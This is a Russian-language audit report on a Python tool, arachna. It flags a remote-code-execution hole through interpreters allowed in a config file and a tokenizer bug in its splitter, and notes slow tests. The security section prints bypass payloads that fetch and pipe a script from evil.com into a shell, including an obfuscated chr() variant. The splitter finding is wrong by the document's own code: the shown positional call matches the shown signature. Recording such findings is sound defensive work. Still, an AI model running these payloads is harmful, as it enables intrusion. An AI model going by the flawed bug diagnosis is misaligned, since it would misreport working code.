## Безопасность

### [CRITICAL] src/arachna/runner.py:22-56,131-143 — RCE через command в .arachna.json

**Статус**: не исправлено с предыдущего аудита. CHANGELOG v0.7.0 утверждает обратное, но код содержит интерпретаторы. TODO.md переносит исправление на v0.7.1.
**Суть**: `_ALLOWED_COMMANDS` (строки 24-56) содержит `python`, `node`, `ruby`, `perl`, `php` — пять интерпретаторов. Команда из `.arachna.json` может выполнить произвольный код: `python -c "import os; os.system('curl evil.com | sh')"`. Строковый фильтр `_BLOCKED_PATTERNS` (строки 60-78) не блокирует `python -c`, потому что проверяет только фиксированные подстроки. `_validate_command()` (строки 93-109) пропускает команду, если её базовое имя в `_ALLOWED_COMMANDS`.

**Влияние сейчас**: любой публичный репозиторий с вредоносным `.arachna.json` выполняет код на машине разработчика. CHANGELOG дезинформирует пользователей о безопасности v0.7.0.

**Риск при росте**: supply chain атака. Пользователь клонирует репозиторий, запускает `arachna --all` — вредоносный код выполнен. При публикации на PyPI (v1.0.0) поверхность атаки расширится на порядок.

**Демонстрация обхода (реальная)**:

    # python в _ALLOWED_COMMANDS, curl в _BLOCKED_PATTERNS
    # Обход: python выполняет код без слова curl в строке
    python -c "import urllib.request; urllib.request.urlopen('http://evil.com/...')"

    # Обход: python -c с закодированной строкой
    python -c "exec('import os; os.system(chr(99)+chr(117)+chr(114)+chr(108)+chr(32)+chr(101)+chr(118)+chr(105)+chr(108)+chr(46)+chr(99)+chr(111)+chr(109))')"

**Рекомендация**: удалить `python`, `node`, `ruby`, `perl`, `php` из `_ALLOWED_COMMANDS`. Оставить только read-only утилиты. Добавить флаг `--allow-scripts` с интерактивным подтверждением для случаев, когда интерпретатор действительно нужен. Это исправление в несколько строк — удалить строки 28-32 в runner.py.

## Архитектура

### [HIGH] src/arachna/splitter.py:3,31,36-83 — splitter игнорирует кастомный токенизатор в _build_parts (ошибка порядка аргументов)

**Статус**: подтверждён в текущем коде. Не исправлен с предыдущего аудита. Усугублён — pluggable tokenizer теперь продвигается в README как фича v0.6.0+, но не работает корректно в основных режимах.
**Суть**: `splitter.py` импортирует `count_tokens` напрямую на строке 3. Функция `split()` (строки 13-34) принимает `tokenizer` и вызывает `_build_parts` на строке 31:

    return _build_parts(sections, max_tokens, separator, tokenizer)

Сигнатура `_build_parts` (строка 36):

    def _build_parts(sections, max_tokens, separator="\n\n", tokenizer=None):

Параметр `tokenizer` передан позиционно как четвёртый аргумент, но между `max_tokens` и `tokenizer` в сигнатуре стоит `separator` со значением по умолчанию. Позиционная передача четвёртым аргументом приводит к тому, что `tokenizer` попадает в параметр `separator`, а `separator` смещается в `tokenizer`. Результат: `_build_parts` всегда использует `tokenizer=None`, что приводит к `tk = count_tokens` (строка 48).

Вызов `_handle_single` на строке 29 корректен — там между `max_tokens` и `tokenizer` нет промежуточных параметров.

**Влияние сейчас**: в режимах `by_file`, `by_paragraph`, `by_marker` разбивка на части всегда использует дефолтный `count_tokens`, игнорируя кастомный токенизатор. Части могут превышать `max_tokens` на 20-30%. Пользователи, настроившие точный tiktoken, получают молчаливое превышение лимита.

**Риск при росте**: pluggable tokenizer — ключевая фича для AI-контекста. Баг подрывает доверие к токен-лимитам. При росте числа пользователей с кастомными токенизаторами проблема станет массовой.

**Исправление**: в вызове `_build_parts` использовать именованные параметры:

    return _build_parts(sections, max_tokens, separator=separator, tokenizer=tk)

И добавить тест, проверяющий, что кастомный токенизатор действительно вызывается в `_build_parts`.

### [HIGH] tests/ — os.chdir блокирует параллельный запуск тестов

**Статус**: не исправлено с предыдущего аудита. TODO.md v0.7.3 планирует исправление.

**Риск при росте**: при 300+ тестах время прогона станет проблемой для CI/CD. Параллельный запуск невозможен.

**Исправление**: перейти на `tmp_path` (pytest fixture) + `monkeypatch.chdir`. Убрать двойное патчение cwd в тестах gatherer (где используется и `os.chdir`, и `patch("pathlib.Path.cwd")`).
